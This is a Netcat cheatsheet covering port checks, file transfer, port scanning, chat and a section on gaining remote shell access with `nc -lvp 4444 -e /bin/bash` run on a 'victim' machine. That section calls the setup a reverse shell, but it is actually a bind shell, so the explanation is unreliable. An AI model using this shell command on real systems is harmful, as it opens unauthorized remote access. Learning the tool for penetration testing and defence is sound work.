# 🖧 Netcat Comprehensive Cheatsheet

## 🔹 Introduction
Netcat (**nc**) is a powerful **networking utility** used for **port scanning, data transfer, debugging, and creating reverse shells**.

---

## 🔹 Installing Netcat
```sh
# Install on Ubuntu/Debian
sudo apt update && sudo apt install netcat -y

# Install on macOS
brew install netcat

# Verify installation
nc -h
```

---

## 🔹 Basic Usage
### ✅ Check if a Port is Open
```sh
nc -zv example.com 80
```

### ✅ Listen for Incoming Connections
```sh
nc -lvp 4444
```

### ✅ Connect to a Listening Port
```sh
nc 192.168.1.10 4444
```

---

## 🔹 File Transfer
### ✅ Send a File
```sh
nc -w 3 192.168.1.10 4444 < file.txt
```

### ✅ Receive a File
```sh
nc -lvp 4444 > file.txt
```

---

## 🔹 Reverse Shell (Gaining Remote Access)
### ✅ Victim Machine (Listener Mode)
```sh
nc -lvp 4444 -e /bin/bash
```

### ✅ Attacker Machine (Connect to Victim)
```sh
nc 192.168.1.10 4444
```

---

## 🔹 Port Scanning
### ✅ Scan for Open Ports
```sh
nc -zv 192.168.1.1 1-1000
```

---

## 🔹 Chat Between Two Systems
### ✅ System 1 (Listener)
```sh
nc -lvp 4444
```

### ✅ System 2 (Connect to Listener)
```sh
nc 192.168.1.10 4444
```

Type messages and press **Enter** to communicate.

---

## 🔹 Best Practices
- **Use `-zv` for non-intrusive port scanning.**
- **Use encryption (OpenSSL) for secure transfers.**
- **Always verify connections to prevent unauthorized access.**
- **Use Netcat responsibly in penetration testing scenarios.**

---